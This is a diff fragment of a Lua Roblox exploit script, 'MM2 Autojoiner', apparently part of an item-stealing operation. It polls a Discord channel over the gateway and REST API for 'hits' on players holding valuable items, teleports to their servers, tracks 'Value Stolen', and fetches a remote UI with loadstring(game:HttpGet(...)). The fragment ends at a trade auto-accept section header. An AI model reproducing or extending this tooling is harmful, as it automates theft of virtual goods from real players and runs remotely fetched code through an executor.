+                    { name = "📌 Last Action",    value = action and (action.msg .. " · " .. agoStr(action.ts)) or "—", inline = false },
+                },
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
+            })
+        else
+            local lastWeaponLine = "—"
+            if weapon then
+                lastWeaponLine = weapon.name .. " x" .. weapon.amount
+                    .. " (" .. commaNum(weapon.value) .. " val) · " .. agoStr(weapon.ts)
+            end
+            sendBotEmbed({
+                color  = paused and 0xE67E22 or 0x95A5A6,
+                title  = paused and "⏸ Paused" or "⏳ Idle",
+                fields = {
+                    { name = "📋 Queue",          value = tostring(qLen),  inline = true },
+                    { name = "🏆 Session Claims", value = claims .. " trades · +" .. commaNum(sessVal) .. " val", inline = true },
+                    { name = "🗡️ Last Weapon",    value = lastWeaponLine,  inline = false },
+                    { name = "📌 Last Action",    value = action and (action.msg .. " · " .. agoStr(action.ts)) or "—", inline = false },
+                },
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
+            })
+        end
+    elseif cmd == "inv" then
+        task.spawn(function()
+            pcall(function()
+                local cache = getgenv()._aj_mmValCache
+                if not cache or (os.time() - (cache.ts or 0)) >= 1800 then
+                    local allV, chrV = {}, {}
+                    local pages = {
+                        { url = "https://www.mm2values.com/?p=godly",   chroma = false },
+                        { url = "https://www.mm2values.com/?p=ancient",  chroma = false },
+                        { url = "https://www.mm2values.com/?p=unique",   chroma = false },
+                        { url = "https://www.mm2values.com/?p=vintage",  chroma = false },
+                        { url = "https://www.mm2values.com/?p=chroma",   chroma = true  },
+                    }
+                    local total = #pages
+                    local done  = 0
+
+                    for _, pg in ipairs(pages) do
+                        task.spawn(function()
+                            pcall(function()
+                                local ok, res = pcall(request, { Url = pg.url, Method = "GET", Headers = { ["User-Agent"] = "Mozilla/5.0" } })
+                                if not ok or not res then return end
+                                local body = res.Body or ""
+                                if pg.chroma then
+                                    for name, raw in body:gmatch("class='chroma%-text'>([^<]+)</div></b> Value: ([%d,]+)") do
+                                        local val = tonumber((raw:gsub(",", "")))
+                                        if val then chrV[nrm(name:gsub("^[Cc]hroma ", ""))] = val end
+                                    end
+                                else
+                                    for name, raw in body:gmatch("<b>([^<]+)</b><br> Value: ([%d,]+)") do
+                                        local val = tonumber((raw:gsub(",", "")))
+                                        if val then allV[nrm(name)] = val end
+                                    end
+                                end
+                            end)
+                            done = done + 1
+                        end)
+                    end
+
+                    local polls = 0
+                    while done < total and polls < 60 do task.wait(0.2); polls = polls + 1 end
+
+                    getgenv()._aj_mmValCache = { allV = allV, chrV = chrV, ts = os.time() }
+                    cache = getgenv()._aj_mmValCache
+                end
+
+                local allV, chrV = cache.allV, cache.chrV
+
+                local inv = game:GetService("ReplicatedStorage").Remotes.Extras.GetFullInventory:InvokeServer(LP.Name)
+                local db  = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+
+                local VINTAGE_PLUS = { Classic = true, Godly = true, Ancient = true, Unique = true }
+                local items, grandTotal = {}, 0
+
+                for id, cnt in pairs(inv['Weapons']['Owned'] or {}) do
+                    if (cnt or 0) > 0 then
+                        local d = db[id]
+                        if d and VINTAGE_PLUS[d.Rarity or ""] then
+                            local isChroma = id:find("Chroma", 1, true) ~= nil
+                            local key = nrm(d.ItemName or "")
+                            local val = 0
+                            if isChroma then
+                                val = chrV[key] or 0
+                            else
+                                val = allV[key] or 0
+                                if val == 0 then
+                                    for k, v in pairs(allV) do
+                                        if k:find(key, 1, true) then val = v; break end
+                                    end
+                                end
+                            end
+                            local sub = val * cnt
+                            grandTotal = grandTotal + sub
+                            table.insert(items, { name = d.ItemName, cnt = cnt, val = val, sub = sub })
+                        end
+                    end
+                end
+
+                table.sort(items, function(a, b) return a.sub > b.sub end)
+
+                if #items == 0 then
+                    sendBotMsg("📦 No Vintage+ items found")
+                    return
+                end
+
+                local MAX_SHOW = 25
+                local lines = {}
+                for i, it in ipairs(items) do
+                    if i > MAX_SHOW then break end
+                    local label = it.cnt > 1 and (it.name .. " x" .. it.cnt) or it.name
+                    local valStr = it.val > 0 and commaNum(it.sub) or "?"
+                    table.insert(lines, string.format("%-22s %s", label, valStr))
+                end
+                if #items > MAX_SHOW then
+                    table.insert(lines, "  ... and " .. (#items - MAX_SHOW) .. " more")
+                end
+                table.insert(lines, string.rep("\xe2\x94\x80", 28))
+                table.insert(lines, string.format("%-22s %s", "Total", commaNum(grandTotal)))
+
+                sendBotEmbed({
+                    title       = "📦  My Inventory  —  " .. commaNum(grandTotal) .. " value",
+                    description = "```\n" .. table.concat(lines, "\n") .. "\n```",
+                    color       = 5763719,
+                    footer      = { text = #items .. " items  •  mm2values.com" },
+                })
+            end)
+        end)
+    elseif cmd == "rejoin" then
+        local ch = getgenv()._aj_currentHit
+        if ch then
+            sendBotMsg("🔄 Rejoining **" .. ch.playerName .. "**...")
+            logMsg("Rejoining " .. ch.playerName)
+            visited[ch.jobId] = nil
+            joinServer(ch)
+        else
+            sendBotMsg("❌ No active hit to rejoin")
+        end
+    elseif cmd == "serverhop" then
+        sendBotMsg("🔀 Server hopping...")
+        logMsg("Server hopping via !serverhop")
+        task.spawn(doServerHop)
+    elseif cmd == "retry" then
+        local last = getgenv()._aj_lastFailedHit
+        if last then
+            visited[last.jobId] = nil
+            if isHitStillLive(last) then
+                sendBotMsg("🔄 Retrying **" .. last.playerName .. "** (" .. commaNum(last.value) .. " value)...")
+                logMsg("Retry: " .. last.playerName)
+                enqueue(last)
+            else
+                sendBotMsg("❌ **" .. last.playerName .. "** already left — can't retry")
+                logMsg("Retry failed: " .. last.playerName .. " — left server")
+            end
+        else
+            sendBotMsg("❌ No failed hit recorded")
+        end
+    elseif cmd == "lastclaim" then
+        local info = getgenv()._aj_lastClaimInfo
+        local t    = getgenv()._aj_lastClaimTime or 0
+        if info and t > 0 then
+            local ago = os.time() - t
+            local agoStr = ago < 60 and (ago .. "s ago") or (math.floor(ago/60) .. "m " .. (ago%60) .. "s ago")
+            local lines = {}
+            for _, it in ipairs(info.items or {}) do
+                table.insert(lines, it.name .. " x" .. it.amount .. "  (" .. commaNum(it.value) .. " val)")
+            end
+            local desc = #lines > 0 and table.concat(lines, "\n") or "No item diff recorded"
+            sendBotEmbed({
+                color       = 0x2ECC71,
+                title       = "🕑 Last Claim — " .. agoStr,
+                description = "```\n" .. desc .. "\n```",
+                fields      = {
+                    { name = "From",  value = info.playerName,              inline = true },
+                    { name = "Value", value = commaNum(info.totalVal or 0), inline = true },
+                },
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
+            })
+        else
+            sendBotMsg("❌ No claim recorded this session")
+        end
+    elseif cmd == "norender" then
+        if getgenv()._aj_norender then
+            destroyNoRender()
+            sendBotMsg("🖥️ No-render mode **OFF** — rendering restored")
+        else
+            buildNoRender()
+            sendBotMsg("⬛ No-render mode **ON** — black screen + stats active")
+        end
+    elseif cmd == "help" then
+        sendBotEmbed({
+            color = 0x2ECC71,
+            title = "📋 MM2 Autojoiner — Commands",
+            description = table.concat({
+                "**!status** — current target, value, time in server, queue size",
+                "**!inv** — your MM2 inventory (Godly+) with values",
+                "**!rejoin** — teleport back to the active hit's server",
+                "**!serverhop** — leave and join a random MM2 server",
+                "**!retry** — retry the last hit that failed to join",
+                "**!lastclaim** — info about the last successfully claimed trade",
+                "**!norender** — toggle black-screen no-render mode (stats overlay)",
+                "**!help** — this message",
+            }, "\n"),
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
+        })
+    end
+end
+
+-- ═══════════════════════════════════════════════════════════════════════
+-- NO-RENDER OVERLAY
+-- Black ScreenGui behind all game UI (low DisplayOrder).
+-- Shows live stats. Toggle via !norender command or AJ_NORENDER flag.
+-- ═══════════════════════════════════════════════════════════════════════
+local _nrGui, _nrLabel, _nrConsole, _nrLoop
+
+destroyNoRender = function()
+    if _nrGui then pcall(function() _nrGui:Destroy() end) end
+    _nrGui, _nrLabel, _nrConsole = nil, nil, nil
+    if _nrLoop then _nrLoop = false end
+    getgenv()._aj_norender = false
+end
+
+buildNoRender = function()
+    destroyNoRender()
+    getgenv()._aj_norender = true
+
+    -- Wait for PlayerGui to be ready (important after teleport)
+    local lp = Players.LocalPlayer
+    local pg
+    for _ = 1, 30 do
+        local ok, r = pcall(function() return lp:WaitForChild("PlayerGui", 1) end)
+        if ok and r then pg = r; break end
+        task.wait(0.5)
+    end
+    if not pg then return end
+
+    local sg = Instance.new("ScreenGui")
+    sg.Name             = "AJ_NoRender"
+    sg.ResetOnSpawn     = false
+    sg.DisplayOrder     = -999   -- behind all game UI; CoreGui always on top
+    sg.IgnoreGuiInset   = true
+    sg.Parent           = pg
+    _nrGui = sg
+
+    -- Full black background
+    local bg = Instance.new("Frame")
+    bg.Size                 = UDim2.fromScale(1, 1)
+    bg.Position             = UDim2.fromScale(0, 0)
+    bg.BackgroundColor3     = Color3.fromRGB(0, 0, 0)
+    bg.BackgroundTransparency = 0
+    bg.BorderSizePixel      = 0
+    bg.ZIndex               = 1
+    bg.Parent               = sg
+
+    -- Stats panel — centered, fixed width
+    local PANEL_W = 420
+    local PANEL_H = 220
+    local panel = Instance.new("Frame")
+    panel.Size              = UDim2.new(0, PANEL_W, 0, PANEL_H)
+    panel.Position          = UDim2.new(0.5, -math.floor(PANEL_W/2), 0.5, -math.floor((PANEL_H + 140)/2))
+    panel.BackgroundColor3  = Color3.fromRGB(15, 15, 15)
+    panel.BackgroundTransparency = 0.3
+    panel.BorderSizePixel   = 0
+    panel.ZIndex            = 2
+    panel.Parent            = sg
+
+    local lbl = Instance.new("TextLabel")
+    lbl.Size                = UDim2.fromScale(1, 1)
+    lbl.Position            = UDim2.fromOffset(0, 0)
+    lbl.BackgroundTransparency = 1
+    lbl.TextColor3          = Color3.fromRGB(220, 220, 220)
+    lbl.TextXAlignment      = Enum.TextXAlignment.Left
+    lbl.TextYAlignment      = Enum.TextYAlignment.Top
+    lbl.Font                = Enum.Font.Code
+    lbl.TextSize            = 13
+    lbl.TextWrapped         = false
+    lbl.ZIndex              = 3
+    lbl.Parent              = panel
+    _nrLabel = lbl
+
+    -- Console panel — below stats, same width, scrolls last 8 log lines
+    local CON_H = 120
+    local conPanel = Instance.new("Frame")
+    conPanel.Size             = UDim2.new(0, PANEL_W, 0, CON_H)
+    conPanel.Position         = UDim2.new(0.5, -math.floor(PANEL_W/2), 0.5, -math.floor((PANEL_H + 140)/2) + PANEL_H + 8)
+    conPanel.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
+    conPanel.BackgroundTransparency = 0.2
+    conPanel.BorderSizePixel  = 0
+    conPanel.ZIndex           = 2
+    conPanel.Parent           = sg
+
+    local conLbl = Instance.new("TextLabel")
+    conLbl.Size               = UDim2.fromScale(1, 1)
+    conLbl.Position           = UDim2.fromOffset(4, 4)
+    conLbl.Size               = UDim2.new(1, -8, 1, -8)
+    conLbl.BackgroundTransparency = 1
+    conLbl.TextColor3         = Color3.fromRGB(100, 200, 100)
+    conLbl.TextXAlignment     = Enum.TextXAlignment.Left
+    conLbl.TextYAlignment     = Enum.TextYAlignment.Bottom
+    conLbl.Font               = Enum.Font.Code
+    conLbl.TextSize           = 11
+    conLbl.TextWrapped        = true
+    conLbl.ZIndex             = 3
+    conLbl.Parent             = conPanel
+    _nrConsole = conLbl
+
+    _nrLoop = true
+    task.spawn(function()
+        local Stats   = game:GetService("Stats")
+        local startTs = os.time()
+        while _nrLoop and _nrGui and _nrGui.Parent do
+            pcall(function()
+                local ch    = getgenv()._aj_currentHit
+                local q     = hitQueue and #hitQueue or 0
+                local up    = os.time() - startTs
+                local upStr = string.format("%dh %02dm %02ds", math.floor(up/3600), math.floor(up/60)%60, up%60)
+                local ping  = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
+                local fps   = math.floor(workspace:GetRealPhysicsFPS())
+                local gwSt  = getgenv()._aj_gwSession and "GW ✓" or "REST"
+
+                _nrLabel.Text = table.concat({
+                    "[ MM2 AUTOJOINER — NO RENDER ]",
+                    "",
+                    string.format("  Target  : %s", ch and ch.playerName or "—"),
+                    string.format("  Value   : %s", ch and commaNum(ch.value) or "—"),
+                    string.format("  Queue   : %d hits", q),
+                    "",
+                    string.format("  Uptime  : %s   Ping: %d ms   FPS: %d   %s", upStr, ping, fps, gwSt),
+                    (function()
+                        local ci = getgenv()._aj_lastClaimInfo
+                        if ci then return string.format("  Last    : %s (+%s val)", ci.playerName, commaNum(ci.totalVal or 0)) end
+                        return ""
+                    end)(),
+                }, "\n")
+
+                -- Console: last 8 logEntries (shared with main log system)
+                if _nrConsole and logEntries then
+                    local n   = math.min(8, #logEntries)
+                    local buf = {}
+                    for i = n, 1, -1 do table.insert(buf, logEntries[i]) end
+                    _nrConsole.Text = table.concat(buf, "\n")
+                end
+            end)
+            task.wait(1)
+        end
+    end)
+end
+
+if getgenv()._aj_norender then
+    task.spawn(buildNoRender)
+end
+
+-- ═══════════════════════════════════════════════════════════════════════
+-- WINDUI  (optional — core logic works even if this fails to load)
+-- ═══════════════════════════════════════════════════════════════════════
+local WindUI, curTarget, curState, wsStatus, qSlots, statTime, statVal, statVisited, statLastTrade
+local paused   = false
+local MAX_SLOTS = 6
+qSlots = {}
+
+task.spawn(function()
+    if AJ_HEADLESS then warn("[AJ] Headless mode — WindUI skipped"); return end
+    for attempt = 1, 3 do
+        local ok, result = pcall(function()
+            return loadstring(game:HttpGet("https://raw.githubusercontent.com/MarkRuiz00/windui-fork/refs/heads/main/main.lua"))()
+        end)
+        if ok and type(result) == "table" and result.SetFont then
+            WindUI = result; break
+        end
+        task.wait(2)
+    end
+    if not WindUI then warn("[MM2 Autojoiner] WindUI failed — running headless"); return end
+
+    pcall(function() WindUI:SetTheme("Midnight") end)
+    WindUI:SetFont("rbxasset://fonts/families/Montserrat.json")
+
+    local Window = WindUI:CreateWindow({
+        Title = "MM2 Autojoiner", Author = "REST", Folder = "MM2AJ",
+        NewElements = true, HideSearchBar = true,
+        OpenButton = {
+            Title = "AJ", CornerRadius = UDim.new(0,10), StrokeThickness = 10,
+            Enabled = true, Draggable = true, Scale = 1.1,
+            Position = UDim2.new(0, 20, 1, -130),
+            Color = ColorSequence.new(Color3.fromHex("#00f5ff"), Color3.fromHex("#cc00ff")),
+        },
+        Topbar = { Height = 44, ButtonsType = "Mac" },
+    })
+    Window:SetToggleKey(Enum.KeyCode.RightControl)
+
+    local Secs = {
+        Main = Window:Section({ Title = "Autojoiner", Box = false, FontWeight = "SemiBold", TextSize = 17, Opened = true }),
+        Cfg  = Window:Section({ Title = "Config",     Box = false, FontWeight = "SemiBold", TextSize = 17, Opened = false }),
+    }
+    local Tabs = {
+        Queue    = Secs.Main:Tab({ Title = "Queue",   Icon = "list"      }),
+        Stats    = Secs.Main:Tab({ Title = "Stats",   Icon = "bar-chart" }),
+        Console  = Secs.Main:Tab({ Title = "Console", Icon = "terminal"  }),
+        Settings = Secs.Cfg:Tab({  Title = "Settings", Icon = "settings"  }),
+    }
+
+    -- Queue tab
+    local curSec = Tabs.Queue:Section({ Title = "Current Target", Box = true, BoxBorder = true, Opened = true })
+    curTarget = curSec:Paragraph({ Title = "No active target", Desc = "Listening for hits..." })
+    curState  = curSec:Paragraph({ Title = "Status", Desc = "Idle" })
+    local ctrlSec = Tabs.Queue:Section({ Title = "Control", Box = true, BoxBorder = true, Opened = true })
+    ctrlSec:Toggle({ Title = "Paused", Value = false, Callback = function(v) paused = v end })
+    ctrlSec:Button({ Title = "Skip Current", Callback = function()
+        getgenv()._aj_done = true
+        getgenv()._aj_doneReason = "Skipped"
+        pcall(function() WindUI:Notify({ Title = "Autojoiner", Desc = "Skipping...", Icon = "skip-forward", Duration = 2 }) end)
+    end })
+    local qSec = Tabs.Queue:Section({ Title = "Hit Queue", Box = true, BoxBorder = true, Opened = true })
+    for i = 1, MAX_SLOTS do qSlots[i] = qSec:Paragraph({ Title = "—", Desc = "" }) end
+
+    -- Stats tab
+    local statSec = Tabs.Stats:Section({ Title = "Session", Box = true, BoxBorder = true, Opened = true })
+    statTime      = statSec:Paragraph({ Title = "Session Time",   Desc = "0m 0s" })
+    statVal       = statSec:Paragraph({ Title = "Value Stolen",   Desc = "0" })
+    statVisited   = statSec:Paragraph({ Title = "Servers Joined", Desc = "0" })
+    statLastTrade = statSec:Paragraph({ Title = "No Trade For",   Desc = "—" })
+    local wsSec = Tabs.Stats:Section({ Title = "Discord", Box = true, BoxBorder = true, Opened = true })
+    wsStatus    = wsSec:Paragraph({ Title = "Poll Status", Desc = "Starting..." })
+
+    -- Console tab
+    local consoleSec = Tabs.Console:Section({ Title = "Event Log", Box = true, BoxBorder = true, Opened = true })
+    consoleSec:Button({ Title = "Clear Log", Callback = function()
+        for i = 1, #logEntries do logEntries[i] = nil end
+        for _, s in ipairs(logSlots) do pcall(function() s:SetTitle("—"); s:SetDesc("") end) end
+    end })
+    for i = 1, LOG_MAX do
+        logSlots[i] = consoleSec:Paragraph({ Title = "—", Desc = "" })
+    end
+
+    -- Settings tab (maintenance only — no trade configs)
+    local miscSec = Tabs.Settings:Section({ Title = "Maintenance", Box = true, BoxBorder = true, Opened = true })
+    miscSec:Button({ Title = "Clear Visited + Queue", Callback = function()
+        for k in pairs(visited) do visited[k] = nil end
+        for i = #hitQueue, 1, -1 do table.remove(hitQueue, i) end
+        pcall(function() WindUI:Notify({ Title = "Autojoiner", Desc = "Cleared", Icon = "trash-2", Duration = 2 }) end)
+    end })
+    miscSec:Button({ Title = "Reset Baseline (re-exec after)", Callback = function()
+        -- Deletes the saved baseline so the next execute rescans from the current
+        -- latest message. Use if you want to pick up a hit that was posted before
+        -- the script was started this session.
+        pcall(writefile, BASELINE_FILE, "")
+        pcall(function() WindUI:Notify({ Title = "Baseline Reset", Desc = "Re-execute script to take effect", Icon = "refresh-cw", Duration = 4 }) end)
+    end })
+    miscSec:Button({ Title = "Reset Session Stats", Callback = function()
+        getgenv()._aj_sessionVal = 0; getgenv()._aj_sessionHits = 0; getgenv()._aj_sessionStart = os.time()
+    end })
+
+    -- UI update loop
+    task.spawn(function()
+        while alive() do
+            local ch = getgenv()._aj_currentHit
+            pcall(function()
+                if curTarget then
+                    if ch then
+                        curTarget:SetTitle(ch.playerName .. "  ·  " .. commaNum(ch.value) .. " value")
+                        curTarget:SetDesc("In server " .. elapsedStr(getgenv()._aj_inServerSince))
+                        local reason = getgenv()._aj_doneReason
+                        curState:SetDesc(
+                            getgenv()._aj_done and ("Done · " .. (reason ~= "" and reason or "moving on"))
+                            or paused and "Paused"
+                            or "Active"
+                        )
+                    else
+                        curTarget:SetTitle("No active target")
+                        curTarget:SetDesc(paused and "Paused" or (#hitQueue > 0 and (#hitQueue .. " queued") or "Waiting..."))
+                        curState:SetDesc("Idle")
+                    end
+                end
+                for i = 1, MAX_SLOTS do
+                    if qSlots[i] then
+                        local h = hitQueue[i]
+                        if h then qSlots[i]:SetTitle("#"..i.."  "..h.playerName); qSlots[i]:SetDesc(commaNum(h.value).." value")
+                        else qSlots[i]:SetTitle("—"); qSlots[i]:SetDesc("") end
+                    end
+                end
+                if statTime  then statTime:SetDesc(elapsedStr(getgenv()._aj_sessionStart)) end
+                if statVal   then statVal:SetDesc(commaNum(getgenv()._aj_sessionVal or 0).." value") end
+                if statVisited then statVisited:SetDesc(tostring(getgenv()._aj_sessionHits or 0)) end
+                if statLastTrade then
+                    local lastT = getgenv()._aj_lastTradeTime or 0
+                    if lastT == 0 or not getgenv()._aj_currentHit then
+                        statLastTrade:SetDesc("—")
+                    else
+                        local ago = os.time() - lastT
+                        local s = ago % 60
+                        statLastTrade:SetDesc(ago < 60 and (ago.."s") or (math.floor(ago/60).."m "..s.."s"))
+                    end
+                end
+            end)
+            task.wait(2)
+        end
+    end)
+
+    pcall(function() WindUI:Notify({ Title = "MM2 Autojoiner", Desc = "Polling Discord · RightCtrl to toggle", Icon = "zap", Duration = 4 }) end)
+end)
+
+-- ═══════════════════════════════════════════════════════════════════════
+-- MESSAGE PROCESSOR  (shared by gateway real-time events + REST fallback)
+-- Handles commands, knownPlayers, hit parsing, dedup, reaction, mid-teleport switch
+-- ═══════════════════════════════════════════════════════════════════════
+local function processMsg(msg)
+    if tostring(msg.channel_id) ~= tostring(chanelid) then return end
+    local msgId = tostring(msg.id)
+
+    -- Commands: non-webhook plain messages starting with !
+    if not msg.webhook_id and msg.content then
+        local cmd = msg.content:match("^!(%S+)")
+        if cmd then
+            local sender = (msg.author and msg.author.username) or "unknown"
+            task.spawn(function() handleCommand(cmd:lower(), sender) end)
+        end
+    end
+
+    -- Collect author name for trade whitelist
+    local embed = msg.embeds and msg.embeds[1]
+    local name  = embed and embed.author and embed.author.name
+    if name and name ~= "" and name ~= "Unknown" then
+        getgenv()._aj_knownPlayers[name] = true
+    end
+
+    -- Skip if already processed (dedup)
+    if isSeen(msgId) then return end
+
+    local _ok, hit = pcall(parseHit, msg)
+    if not (_ok and hit) then return end
+
+    markSeen(msgId)
+    task.spawn(function() reactOk(msgId) end)  -- react ✅ so transferer sees it was picked up
+
+    -- Mid-teleport switch: if a better hit arrives while we're teleporting, jump to it
+    local ch = getgenv()._aj_currentHit
+    if getgenv()._aj_teleporting and ch and hit.value > ch.value then
+        logMsg("Mid-teleport switch → " .. hit.playerName .. " (" .. commaNum(hit.value) .. " > " .. commaNum(ch.value) .. ")")
+        joinServer(hit)
+        return
+    end
+
+    enqueue(hit)
+    logMsg("Hit: " .. hit.playerName .. " · " .. commaNum(hit.value) .. " value")
+    pcall(function()
+        WindUI:Notify({
+            Title = "Hit Detected",
+            Desc  = hit.playerName .. " · " .. commaNum(hit.value) .. " value",
+            Icon  = "target", Duration = 5,
+        })
+    end)
+end
+
+-- ═══════════════════════════════════════════════════════════════════════
+-- DISCORD WEBSOCKET GATEWAY
+-- Real-time message delivery via wss://gateway.discord.gg
+-- Replaces REST polling — no delay, no rate limit spend on fetches.
+-- Falls back to REST polling if WebSocket is not available.
+-- Session/seq/resumeUrl survive teleports via getgenv() for RESUME.
+-- ═══════════════════════════════════════════════════════════════════════
+local function startGateway()
+    if bottoken == "" then
+        pcall(function() wsStatus:SetDesc("No token set") end)
+        return
+    end
+    if not chanelid or chanelid == "" then
+        pcall(function() wsStatus:SetDesc("No channel ID — check webhook URL") end)
+        return
+    end
+
+    -- ── Startup REST scan ──────────────────────────────────────────────
+    -- Gateway only delivers NEW messages; this catches hits posted before we connected.
+    -- Also seeds knownPlayers from recent history.
+    pcall(function()
+        local res = request({
+            Url     = "https://discord.com/api/v10/channels/" .. chanelid .. "/messages?limit=50",
+            Method  = "GET",
+            Headers = { ["Authorization"] = bottoken, ["Content-Type"] = "application/json" },
+        })
+        if res and res.StatusCode == 200 and res.Body then
+            local msgs = HttpService:JSONDecode(res.Body)
+            -- oldest-first so queue is sorted properly
+            for i = #msgs, 1, -1 do
+                local m = msgs[i]
+                local embed = m.embeds and m.embeds[1]
+                local n = embed and embed.author and embed.author.name
+                if n and n ~= "" and n ~= "Unknown" then
+                    getgenv()._aj_knownPlayers[n] = true
+                end
+                if embed and not isDeadEmbed(embed) and not isSeen(tostring(m.id)) then
+                    local _ok, hit = pcall(parseHit, m)
+                    if _ok and hit then
+                        markSeen(tostring(m.id))
+                        enqueue(hit)
+                        logMsg("Startup hit: " .. hit.playerName .. " · " .. commaNum(hit.value) .. " value")
+                    end
+                end
+            end
+        end
+    end)
+
+    -- ── WebSocket Gateway ──────────────────────────────────────────────
+    if not WebSocket then
+        warn("[AJ GW] WebSocket not available — falling back to REST polling (3s interval)")
+        pcall(function() wsStatus:SetDesc("REST polling (no WebSocket)") end)
+        -- REST fallback identical to old behaviour
+        local lastSeenId = loadBaseline()
+        if not lastSeenId then
+            pcall(function()
+                local res = request({
+                    Url     = "https://discord.com/api/v10/channels/" .. chanelid .. "/messages?limit=1",
+                    Method  = "GET",
+                    Headers = { ["Authorization"] = bottoken, ["Content-Type"] = "application/json" },
+                })
+                if res and res.StatusCode == 200 and res.Body then
+                    local msgs = HttpService:JSONDecode(res.Body)
+                    if msgs and msgs[1] then lastSeenId = tostring(msgs[1].id); saveBaseline(lastSeenId) end
+                end
+            end)
+        end
+        task.spawn(function()
+            while alive() do
+                task.wait(3)
+                pcall(function()
+                    local url = "https://discord.com/api/v10/channels/" .. chanelid .. "/messages?limit=10"
+                    if lastSeenId then url = url .. "&after=" .. lastSeenId end
+                    local res = request({ Url = url, Method = "GET", Headers = { ["Authorization"] = bottoken, ["Content-Type"] = "application/json" } })
+                    if not res or res.StatusCode ~= 200 then return end
+                    local msgs = HttpService:JSONDecode(res.Body)
+                    if not msgs or #msgs == 0 then return end
+                    for i = #msgs, 1, -1 do processMsg(msgs[i]) end
+                    lastSeenId = tostring(msgs[1].id); saveBaseline(lastSeenId)
+                    pcall(function() wsStatus:SetDesc("REST · " .. os.date("%H:%M:%S")) end)
+                end)
+            end
+        end)
+        return
+    end
+
+    local gwConnId  = 0
+    local gwSocket  = nil
+    local helloGenId = 0
+    local readyGenId = 0
+
+    local function sendGW(op, d)
+        if not gwSocket then return end
+        pcall(function() gwSocket:Send(HttpService:JSONEncode({ op = op, d = d })) end)
+    end
+
+    local function connectGateway()
+        if not alive() then return end
+        gwConnId = gwConnId + 1
+        local myId = gwConnId
+
+        local url = "wss://gateway.discord.gg/?v=10&encoding=json"
+        if getgenv()._aj_gwResume and getgenv()._aj_gwResumeUrl then
+            url = getgenv()._aj_gwResumeUrl .. "/?v=10&encoding=json"
+        end
+
+        warn("[AJ GW] Connecting gen " .. myId)
+        pcall(function() wsStatus:SetDesc("Gateway connecting...") end)
+
+        -- IMPORTANT: do NOT wrap in pcall — it is a yielding call and wrapping it
+        -- causes executors to return a dead socket that never receives HELLO.
+        gwSocket = WebSocket.connect(url)
+
+        if not gwSocket then
+            warn("[AJ GW] connect returned nil, retrying in 5s")
+            task.wait(5 + math.random() * 5)
+            if gwConnId == myId and alive() then connectGateway() end
+            return
+        end
+
+        gwSocket.OnMessage:Connect(function(raw)
+            if gwConnId ~= myId then return end
+            local data
+            pcall(function() data = HttpService:JSONDecode(raw) end)
+            if not data then return end
+
+            if data.s then getgenv()._aj_gwSeq = data.s end
+
+            -- op 10: HELLO — start heartbeat, then IDENTIFY or RESUME
+            if data.op == 10 then
+                helloGenId = myId
+                local interval = data.d.heartbeat_interval / 1000
+                if getgenv()._aj_gwResume and getgenv()._aj_gwSession and getgenv()._aj_gwSeq then
+                    warn("[AJ GW] HELLO → RESUME")
+                    sendGW(6, { token = bottoken, session_id = getgenv()._aj_gwSession, seq = getgenv()._aj_gwSeq })
+                else
+                    warn("[AJ GW] HELLO → IDENTIFY")
+                    sendGW(2, {
+                        token      = bottoken,
+                        intents    = 33280,  -- GUILDS(1) + GUILD_MESSAGES(512) + MESSAGE_CONTENT(32768)
+                        properties = { os = "linux", browser = "opsec", device = "desktop" },
+                    })
+                end
+                task.spawn(function()
+                    while gwConnId == myId and alive() do
+                        task.wait(interval)
+                        if gwConnId ~= myId then break end
+                        sendGW(1, getgenv()._aj_gwSeq)
+                    end
+                end)
+            end
+
+            -- op 0: dispatch
+            if data.op == 0 then
+                if data.t == "READY" then
+                    getgenv()._aj_gwSession   = data.d.session_id
+                    getgenv()._aj_gwResumeUrl = data.d.resume_gateway_url
+                    getgenv()._aj_gwResume    = true
+                    readyGenId = myId
+                    warn("[AJ GW] READY")
+                    pcall(function() wsStatus:SetDesc("Gateway live ✓ " .. os.date("%H:%M:%S")) end)
+                elseif data.t == "RESUMED" then
+                    readyGenId = myId
+                    warn("[AJ GW] RESUMED")
+                    pcall(function() wsStatus:SetDesc("Gateway resumed ✓ " .. os.date("%H:%M:%S")) end)
+                elseif data.t == "MESSAGE_CREATE" then
+                    local msg = data.d
+                    if tostring(msg.channel_id) == tostring(chanelid) then
+                        task.spawn(function() processMsg(msg) end)
+                    end
+                end
+            end
+
+            -- op 7: server wants us to reconnect with RESUME
+            if data.op == 7 then
+                getgenv()._aj_gwResume = true
+                pcall(function() if gwSocket then gwSocket:Close() end end)
+            end
+
+            -- op 9: invalid session — resume if d==true, else re-identify
+            if data.op == 9 then
+                getgenv()._aj_gwResume = (data.d == true)
+                if not getgenv()._aj_gwResume then getgenv()._aj_gwSession = nil end
+                task.wait(math.random(1, 5))
+                pcall(function() if gwSocket then gwSocket:Close() end end)
+            end
+        end)
+
+        gwSocket.OnClose:Connect(function()
+            if gwConnId ~= myId then return end
+            gwSocket = nil
+            warn("[AJ GW] Closed — reconnecting")
+            pcall(function() wsStatus:SetDesc("Gateway closed — reconnecting...") end)
+            if getgenv()._aj_gwSession and getgenv()._aj_gwSeq then
+                getgenv()._aj_gwResume = true
+            end
+            task.wait(5 + math.random() * 5)
+            if gwConnId == myId and alive() then connectGateway() end
+        end)
+
+        -- Watchdog: no HELLO in 6s = dead socket (TLS stall) → reconnect immediately
+        task.spawn(function()
+            task.wait(6)
+            if gwConnId == myId and helloGenId ~= myId then
+                warn("[AJ GW] No HELLO (dead socket), fast retry")
+                pcall(function() if gwSocket then gwSocket:Close() end end)
+                if gwConnId == myId then gwSocket = nil; connectGateway() end
+                return
+            end
+            -- HELLO received but no READY after 8s → rate limited, back off
+            task.wait(8)
+            if gwConnId == myId and readyGenId ~= myId then
+                warn("[AJ GW] HELLO but no READY (rate limited?), backing off")
+                pcall(function() if gwSocket then gwSocket:Close() end end)
+                task.wait(3 + math.random() * 4)
+                if gwConnId == myId then gwSocket = nil; connectGateway() end
+            end
+        end)
+    end
+
+    -- connectGateway is a local; call it in a task.spawn so alive() check works inside
+    task.spawn(function()
+        connectGateway()
+    end)
+end
+
+-- ═══════════════════════════════════════════════════════════════════════
+-- TRADE AUTO-ACCEPT
